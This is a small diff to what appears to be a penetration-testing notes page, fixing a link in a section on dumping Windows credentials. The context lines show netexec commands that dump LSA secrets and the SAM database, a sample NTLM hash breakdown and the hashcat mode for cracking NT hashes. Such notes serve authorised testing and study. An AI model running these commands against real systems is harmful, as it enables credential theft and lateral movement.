@@ -31,7 +31,7 @@ netexec smb $target --local-auth -u 'user' -p 'password' --lsa
 netexec smb $target --local-auth -u 'user' -p 'password' --sam
 ```
 
-if remote dumping isn't working, see [LocalAccountTokenFilterPolicy]({{< relref "10. Lateral Movement/Impacket-*exec#localaccounttokenfilterpolicy" >}})
+if remote dumping isn't working, see [LocalAccountTokenFilterPolicy]({{< relref "10. Lateral Movement/Impacket-exec#localaccounttokenfilterpolicy" >}})
 
 > The hash format will be `(uid:rid:lmhash:nthash)`. Example `rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::`, `rocky` is `uid`, `1003` is `rid`,  `aad3b435b51404eeaad3b435b51404ee` is `lmhash`, `184ecdda8cf1dd238d438c4aea4d560d` is `nthash`
 > `hashcat` mode for `nthash` is `1000`
